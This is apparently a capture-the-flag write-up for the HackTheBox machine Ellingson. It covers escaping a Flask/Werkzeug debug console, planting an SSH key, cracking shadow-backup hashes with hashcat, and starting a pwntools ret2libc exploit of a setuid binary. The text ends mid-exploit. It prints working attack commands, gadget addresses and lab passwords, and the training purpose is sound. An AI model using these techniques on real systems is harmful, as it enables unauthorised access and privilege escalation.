
# HackTheBox Ellingson Writeup
This is my first 'hard' box I've completed (although I find this easier than a lot of the other boxes). This is also my first writeup for a hack the box machine, so please let me know [@D4nch3n](https://twitter.com/D4nch3n) if there's anything that's incorrect in it!

## Info card:

![alt text](imgs/info.PNG "Information Card")

## Summary:
Fuzzing web app gives us access to its debugger, which we leverage to get our initial foothold. Once we do that, improperly configured permissions give us access to some password hashes, which we crack to get user-level access. Finally, we get a very familiar privesc, where we reverse and exploit a setuid binary to get root.
## Recon:
Running Nmap on the IP address 10.10.10.139 gives us the following:
```
# Nmap 7.70 scan initiated Sat Jun 15 01:47:20 2019 as: nmap -sC -sV -oA ellingson 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.023s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 15 01:47:33 2019 -- 1 IP address (1 host up) scanned in 13.43 seconds

```

Looks like a pretty typical linux server, with an ssh port open and a web application. Since this is OpenSSH version 7.6, a quick google search gives us that the server is running on Ubuntu Bionic Beaver (18.04).

Visiting the webpage gives us a pretty nice-looking homepage:

![alt text](imgs/index.PNG "Webpage")

There's a lot of links on this page, but most of them redirect back to index. There's only three that link to three different articles. The "Suspicious network activity" article looks pretty interesting:

![alt text](imgs/sus.PNG "Password Policy")

Maybe we can use this information to get some passwords! We'll take note of it and move on.

At this point, I noticed that the URLs of the articles follow a pattern. The first article is at http://10.10.10.139/articles/1, the second is at http://10.10.10.139/articles/2, and the third is at http://10.10.10.139/articles/3. Hmmm...what if there's other articles hidden out there? Let's try looking at article 4!

However, when we try to go to http://10.10.10.139/articles/4, we get something very unexpected...

![alt text](imgs/debug.PNG "error")

## Getting code execution

Wait, I thought this application is running through nginx! However, the error trace indicates that it's using the flask templating engine, meaning that python's running on the backend of this server!

Mousing over each line, we see a small command prompt appear on the right side. Clicking on it gives us a python console, where we can execute python commands:

![alt text](imgs/py.PNG "Python Execution")

Cool! This should be very straightforward now, right? Unfortunately, some python commands are restricted:
```
>>> import os
>>> os.system("pwd")
0
>>> os.system("/bin/bash")
0
>>> 
```
Maybe we can use subprocess? Nope:
```
>>> import subprocess
>>> subprocess.call('pwd', shell=True, executable='/bin/bash')
0
>>> subprocess.Popen(['/bin/bash', '-c', 'pwd'])
<subprocess.Popen object at 0x7f42e8024cc0>
>>> subprocess.Popen(['/bin/ls'])
<subprocess.Popen object at 0x7f42e35b2b70>
```

(note: although the Popen object exists, if the command has successfully executed, we would see the command output after the popen object output).

Hmm...how can we get code execution then?

At this point I decided to cheat a bit. I know that python jails have appeared on many recent CTFs, and that people have used them to gain Remote Code Execution. Eventually I came across [this](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/), and decided to go down the list. Eventually, using `__import__()` to import libraries and executing them worked for me:

```
>>> __import__("subprocess").check_output(['ls', '-alt'])
b'total 1970276\ndrwxrwxrwt  10 root root       4096 Jun 18 01:57 tmp\ndrwxr-xr-x  25 root root        900 Jun 18 01:50 run\ndrwxr-xr-x  18 root root       3960 Jun 18 01:48 dev\ndr-xr-xr-x  13 root root          0 Jun 18 01:48 sys\ndr-xr-xr-x 113 root root          0 Jun 18 01:48 proc\ndrwxr-xr-x 101 root root       4096 May  7 13:14 etc\ndrwxr-xr-x   2 root root      12288 May  7 11:22 sbin\ndrwxr-xr-x  23 root root       4096 May  7 11:22 lib\ndrwx------   4 root root       4096 May  1 18:51 root\ndrwxr-xr-x   3 root root       4096 Mar  9 20:18 opt\ndrwxr-xr-x   6 root root       4096 Mar  9 19:21 home\ndrwxr-xr-x  14 root root       4096 Mar  9 19:12 var\ndrwxr-xr-x   4 root root       4096 Mar  9 18:58 snap\n-rw-------   1 root root 2017460224 Mar  9 18:56 swap.img\ndrwxr-xr-x  23 root root       4096 Mar  9 18:56 .\ndrwxr-xr-x  23 root root       4096 Mar  9 18:56 ..\ndrwxr-xr-x   3 root root       4096 Mar  9 18:56 boot\nlrwxrwxrwx   1 root root         33 Mar  9 18:55 initrd.img -> boot/initrd.img-4.15.0-46-generic\nlrwxrwxrwx   1 root root         30 Mar  9 18:55 vmlinuz -> boot/vmlinuz-4.15.0-46-generic\ndrwx------   2 root root      16384 Mar  9 18:51 lost+found\ndrwxr-xr-x   2 root root       4096 Jul 25  2018 bin\nlrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic\nlrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic\ndrwxr-xr-x   2 root root       4096 Jul 25  2018 lib64\ndrwxr-xr-x   2 root root       4096 Jul 25  2018 media\ndrwxr-xr-x   2 root root       4096 Jul 25  2018 mnt\ndrwxr-xr-x   2 root root       4096 Jul 25  2018 srv\ndrwxr-xr-x  10 root root       4096 Jul 25  2018 usr\n'
```
(The output is ugly, but whatever. At least we can execute commands)
Ok, so now that we have remote code execution, getting a shell is easy, right? Right??


## Getting a shell to Hal

At this point, my first reaction is to look for the nearest [ReverseShellCheatSheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) command to give me a reverse shell. My IP was 10.10.14.3 at that time, and I set up a netcat listener on my kali machine. However, each attempt ended in a silent failure.

Can I even ping out back to my box? Trying to execute ping gave me the answer:

![alt text](imgs/noping.PNG "Error code 1")

Googling around, I found that an error code of 1 from ping means that the destination was unreachable. Therefore, I figured that there must be quite a bit of egress filtering enabled on the server using iptables that is preventing us from getting the callbacks of our reverse shells.

Well, we can execute commands at least! Let's see what users are on the system, by reading the /etc/passwd file: (formatted for easier reading)
```
>>> a = open("/etc/passwd", "r")
>>> a.read()
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
theplague:x:1000:1000:Eugene Belford:/home/theplague:/bin/bash
hal:x:1001:1001:,,,:/home/hal:/bin/bash
margo:x:1002:1002:,,,:/home/margo:/bin/bash
duke:x:1003:1003:,,,:/home/duke:/bin/bash
postfix:x:111:114::/var/spool/postfix:/usr/sbin/nologin\n'
```
Nice! Looks like we have 4 logon users (theplague, hal, margo, and duke), www-data for the webserver, and sshd for ssh. However, www-data is associated with nginx, not flask. Let's get /proc/self/environ to see our environment variables: (again formatted for easier reading)
```
>>> a = open("/proc/self/environ", "r")
>>> a.read()
LANG=en_US.UTF-8
INVOCATION_ID=7165cee80c8d4b498741ae4570093b6f
FLASK_DEBUG=1
USER=hal
PWD=/
HOME=/home/hal
JOURNAL_STREAM=9:28468
WERKZEUG_DEBUG_PIN=off
SHELL=/bin/bash
SHLVL=1
LOGNAME=hal
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/python3
WERKZEUG_SERVER_FD=3
WERKZEUG_RUN_MAIN=true
```
Cool, so we're running as the login user hal! Since he has a home directory, we should be able to see what's inside!
```
>>> __import__("subprocess").check_output(['ls', '-alt', '/home/hal'])
total 36
drwxrwx--- 5 hal  hal  4096 May  7 13:12 .
drwx------ 2 hal  hal  4096 Mar 10 17:33 .cache
drwx------ 3 hal  hal  4096 Mar 10 17:33 .gnupg
drwx------ 2 hal  hal  4096 Mar  9 19:30 .ssh
-rw------- 1 hal  hal   865 Mar  9 19:30 .viminfo
drwxr-xr-x 6 root root 4096 Mar  9 19:21 ..
-rw-r--r-- 1 hal  hal   220 Mar  9 19:20 .bash_logout
-rw-r--r-- 1 hal  hal  3771 Mar  9 19:20 .bashrc
-rw-r--r-- 1 hal  hal   807 Mar  9 19:20 .profile
```

Dang, no user.txt file yet! However, looks like we do have access to the .ssh file! However, before we do, let's take a look at the /etc/ssh/sshd_config file! (I also just realized that read() and write() worked as well...no need for the ugly output)
```
>>> f = open("/etc/ssh/sshd_config")
>>> print(f.read())
#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
...
<trimmed>
...
#PubkeyAuthentication yes
...
...
```

Cool! The default option for PubkeyAuthentication is yes, so it doesn't matter if it's commented or not. However, since I can write to files, I can write my public key (id_rsa.pub) to the /home/hal/.ssh/authorized_keys file. Then, when I SSH, I can authenticate myself as hal using public key authentication!
```
>>> f = open("/home/hal/.ssh/authorized_keys", "w")
>>> f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPyihH7PidR/gKunh0WLsWlhI3j6i5D1Eb8WA+h26I3WTkryovr15QP8Eo3gaL0XVHGPw6ImdNkNC9GWcQKRwHXNQDLmrW1D9wZxopH/B7VRzniMvFE1i53lZuh1RXWGHzZ0a6XxC0BuhjID8RYKn4Jkhx8+Fp5lDvoXePfxzn4s+Z0/CgcT+j3dPog1jb2zjv1fpiqaQddjYcU/vMaH04lEPAzVYwoav9UHflcwRR/IlEKzJ0mPaffV/RVThf1cBg7MYp2+PNbg51Lp43IDhvAApp5q5+1QY8r3CLqD2c1+Gekkz9xTue6mO8KkvmKs7E0p5FJEhkH8WqKFDx1nEd root@kali")
390
>>> f.close()

```
Sure enough, after doing that, we gain access as hal!

![alt text](imgs/halauth.PNG "Pub Key Authenticated!")


## Getting user.txt
Ok, we officially now have shell access! Let's start enumerating!

While checking for setuid binaries, we see the following output:
```
hal@ellingson:~$ find / -perm /4000 -exec ls -alt '{}' \; 2>/dev/null
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22520 Jul 13  2018 /usr/bin/pkexec
-rws------ 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18056 Mar  9 21:04 /usr/bin/garbage
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 44528 Jan 25  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 14328 Jul 13  2018 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Feb 10  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 101240 Feb  3 14:20 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 80056 Jun  5  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 44664 Jan 25  2018 /bin/su
-rwsr-xr-x 1 root root 26696 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 146128 Nov 30  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 64424 Mar  9  2017 /bin/ping
-rwsr-xr-x 1 root root 43088 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6405/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6405/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6405/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/6405/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6405/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/6405/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/6405/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/6405/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/6405/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/6405/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6405/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/6405/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Nov  5  2018 /snap/core/6405/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98472 Feb  6 09:23 /snap/core/6405/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6405/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /snap/core/4917/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/4917/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/4917/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/4917/bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /snap/core/4917/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/4917/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/4917/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/4917/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/4917/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/4917/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/4917/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/4917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/4917/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98440 Jun 21  2018 /snap/core/4917/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/4917/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6818/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6818/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6818/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25 12:09 /snap/core/6818/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6818/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25 12:09 /snap/core/6818/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25 12:09 /snap/core/6818/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25 12:09 /snap/core/6818/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25 12:09 /snap/core/6818/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25 12:09 /snap/core/6818/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6818/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jan 12  2017 /snap/core/6818/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4 14:09 /snap/core/6818/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98472 Apr 11 16:42 /snap/core/6818/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6818/usr/sbin/pppd
```
That's a lot to go through! Starting from the top, however, /usr/bin/garbage looks suspicious:

```
hal@ellingson:~$ /usr/bin/garbage
User is not authorized to access this application. This attempt has been logged.
hal@ellingson:~$ 
```

Let's exfiltrate it out! Unfortunately, due to the strict egress filtering, getting files out of the server is very difficult. I eventually had to resort to base 64 encoding the file by using `base64 /usr/bin/garbage` and copied the output onto my machine.

Binary reversing time!

We can go through it the slow way by using objdump and gdb, but since this is 2019, we shall use Ghidra to speed things up!

Looking at the decompiled main method, we found that the program first calls check_user():

![alt text](imgs/init.PNG "Beginning of main()")

Next let's look at the decompilation of check_user():

![alt text](imgs/chkusr.PNG "check_user()")

Looks like the program is trying to get the userid that's executing the program. If the UID is equal to 1000, 0, or 1002 (0x3ea in decimal), we are allowed to execute it. Otherwise, the program will exit out.

Looking at our id, we see...oh...
```
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
hal@ellingson:~$ 
```
According to /etc/passwd, looks like we need to get to either theplague or margo to be able to execute the binary (or root as well, but let's not get ahead of ourselves)

However, this id command gives us something else. It tells us that hal is in the adm group, which is unusual for a unprivileged user. Googling around gives us [this](https://ubuntuforums.org/showthread.php?t=1318346), which states:
```
adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. 
```
Basically, it means we can view more files in /var than the average user. The path to user must be somewhere in there....

First I tried /var/log/, and see if there's anything interesting that's being logged. Unfortunately, while I can see people authenticating, there's nothing logged that's of value.

Next, I branched out in the general /var directory. I looked at /var/backups, and there's some really interesting files in here...
```
hal@ellingson:/var$ cd backups
hal@ellingson:/var/backups$ ls -alt
total 708
drwxr-xr-x  2 root root     4096 May  7 13:14 .
-rw-r--r--  1 root root    61440 Mar 10 06:25 alternatives.tar.0
-rw-r--r--  1 root root   615441 Mar  9 22:21 dpkg.status.0
-rw-r--r--  1 root root      295 Mar  9 22:21 dpkg.statoverride.0
-rw-------  1 root shadow    678 Mar  9 22:21 gshadow.bak
-rw-------  1 root root      811 Mar  9 22:21 group.bak
-rw-------  1 root root     1757 Mar  9 22:21 passwd.bak
-rw-r--r--  1 root root     8255 Mar  9 22:20 apt.extended_states.0
-rw-r-----  1 root adm      1309 Mar  9 20:42 shadow.bak
drwxr-xr-x 14 root root     4096 Mar  9 19:12 ..
-rw-r--r--  1 root root      437 Jul 25  2018 dpkg.diversions.0
hal@ellingson:/var/backups$ 
```

Viewing backups of the shadow file!? YES PLEASE!
```
hal@ellingson:/var/backups$ cat shadow.bak
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
hal@ellingson:/var/backups$ 
```
Of course we don't get a root hash (That would be way too nice of them), but we have old password hashes of all the login users! Let's try to crack them with the rockyou.txt file, using hashcat: `hashcat -m 1800 -a 0 -o outfile.txt hashes.txt rockyou.txt`

![alt text](imgs/hashcrack.PNG "2 cracked hashes")

(Note: These hashes took hours to crack. Remember the password policies that theplague dictated at the beginning? Well, if you took that into account, you can filter out all passwords that don't have these 4 key words in them to make the cracking process much, much faster. Ah well, running hashcat in the background works too)

Looks like we got two hashes! If we pair them up with the shadow.bak file, we know that password123 was theplague's password, and iamgod$08 is margo's password. Unfortunately theplague changed his password, but fortunately margo did not. We can therefore SSH in as margo:iamgod$08 and get user.txt!

![alt text](imgs/user.PNG "User Obtained!")

## Privesc

Now that we're margo, we can now execute /usr/bin/garbage and bypass check_user():

```
margo@ellingson:~$ /usr/bin/garbage
Enter access password: iamgod$08

access denied.
margo@ellingson:~$ 
```

Ugh, more passwords. Fortunately, running strings on /usr/bin/garbage yields something that looks very much like a password:
```
margo@ellingson:~$ strings /usr/bin/garbage
/lib64/ld-linux-x86-64.so.2
libc.so.6
strcpy
exit
fopen
...


...
gfff
access gH
ranted fH
or user:H
[]A\A]A^A_
Row Row Row Your Boat...
The tankers have stopped capsizing
Balance is $%d
%llx
%lld
/var/secret/accessfile.txt
user: %lu cleared to access this application
user: %lu not authorized to access this application
User is not authorized to access this application. This attempt has been logged.
error
Enter access password: 
N3veRF3@r1iSh3r3!
access granted.
access denied.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
...
...


```
Yeah, N3veRF3@r1iSh3r3! stands apart from the rest. When we enter it we get a menu like game:
```
margo@ellingson:~$ /usr/bin/garbage
Enter access password: N3veRF3@r1iSh3r3!

access granted.
[+] W0rM || Control Application
[+] ---------------------------
Select Option
1: Check Balance
2: Launch
3: Cancel
4: Exit
> 1
Balance is $1337
> 2
Row Row Row Your Boat...
> 3
The tankers have stopped capsizing
> 1
Balance is $1337
> 4
margo@ellingson:~$ 
```

Huh....it doesn't look like anything that can help us get to root. We should take a further look down in ghidra.

Let's revisit the rest of the main method:

![alt text](imgs/main.PNG "Main Method")

So after calling check_user(), the program calls set_username(). Let's see what that does:

![alt text](imgs/setusr.PNG "set_username()")

Hmm, not so interesting. It just gets the user's username and setting a global variable to that value.

However, the next function called by main(), auth(), is more interesting:

![alt text](imgs/auth.PNG "auth()")

Hmm, so it zeroes out the username, gets the password through stdin, and compares it with "N3veRF3@r1iSh3r3!". If they match, print access granted and return true, otherwise return false. However, what's interesting is their choice of functions. They decided to use strcpy and strcat, but these don't matter too much since we can't control these values. However, they also used gets() to obtain the password through stdin, something we very much have control over!

For those who don't know, gets() takes in input until stdin is closed or the user enters a newline, basically taking input without bounds checking. Since each function allocates a certain amount of space on the stack, we can overflow the given space with gets() and modify the return address, therefore controlling where we can execute next! Hence we have a buffer overflow vulnerability!

Time. To. Pwn.

Since we have pwntools installed, let's see the security settings of this binary using checksec:
```
root@kali:~/hackthebox/ellingson/privesc# ls
core  exploit.py  garbage  libc.so.6
root@kali:~/hackthebox/ellingson/privesc# checksec garbage
[*] '/root/hackthebox/ellingson/privesc/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
root@kali:~/hackthebox/ellingson/privesc# 
```

Cool, no canaries or PIE are present! Unfortunately NX is enabled, so no shellcode execution.

Next, since we have access to the system, let's check if ASLR is enabled:

```
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space 
2
margo@ellingson:~$
```
That's unfortunate. (If the output is 0, ASLR is disabled, otherwise it's enabled) This means that we're going to need to use the traditional ret2libc method to get a libc address leak, calculate offsets based on the libc.so.6 file on the remote system, find address of system() and /bin/sh in libc, and ROP our way to a shell.

How much input do we need before we overwrite the return address? Using pwntool's cyclic(), we can find that pretty easily.

![alt text](imgs/cyclic.PNG "cyclic")

Ok, so we need to scream out 136 A's (or B's, I don't judge) before we overwrite the return address. Since this is an amd64-little-endian binary, we'll need to find ways to set the rdi gadget in order to set our parameters to the functions that we want to return. Using ROPgadget, let's see if we have a pop rdi; ret gadget:
```
root@kali:~/hackthebox/ellingson/privesc# ROPgadget --binary garbage
Gadgets information
============================================================
0x000000000040126e : adc dword ptr [rbp - 4], eax ; nop ; pop rbp ; ret
0x0000000000401199 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x00000000004011cb : add bh, bh ; loopne 0x40123a ; nop ; ret
0x000000000040126b : add bl, dh ; movups xmmword ptr [rbp - 4], xmm0 ; nop ; pop rbp ; ret
0x0000000000401381 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401382 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401198 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000401069 : add byte ptr [rax], al ; jmp 0x401029
0x0000000000401383 : add byte ptr [rax], al ; .....
...
...


0x00000000004011c6 : or dword ptr [rdi + 0x4040d0], edi ; jmp rax
0x0000000000401780 : out dx, eax ; call qword ptr [r12 + rbx*8]
0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401798 : pop r14 ; pop r15 ; ret
0x000000000040179a : pop r15 ; ret
0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401239 : pop rbp ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

...
...

```
Nice, we have a pop rdi; ret gadget at 0x40179b!
WLet's plan to leak the address of puts() in libc. We can then use objdump -d on our exfiltrated binary to get the address of puts() in the procedure linking table and the global offset table. These tables are what the compiler and linker uses to dynamically link the libc file, and provide a way for the program to call the libc functions without being impacted with ASLR. 

The procedure linking table (.plt table) is what the program initially calls when it wants to call a libc function, and within the .plt table contains code that jumps based of the absolute value stored in the global offset table (.got table) to the function that's linked from libc. Therefore, the global offset table contains the actual address of the function that's stored in the linked libc's memory.

We're also going to want an address to the auth() function, since ASLR will change the address layout during each program start time. We're going to eventually return to auth() in order to exploit the vulnerability more than once to take advantage of the address leak.

The following is the addresses that we will need:

```python=
from pwn import *

pop_rdi_gadget = 0x40179b
puts_got = 0x404028
puts_plt = 0x401050
auth = 0x401513
```

Next, we'll need a way to talk to the binary. Fortunately, pwntools has a ssh tube library that can allow us to communicate with remote processes that we have ssh access to. Our next part of the exploit looks like this:

```python=
login = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
sh = login.process('/usr/bin/garbage')
```

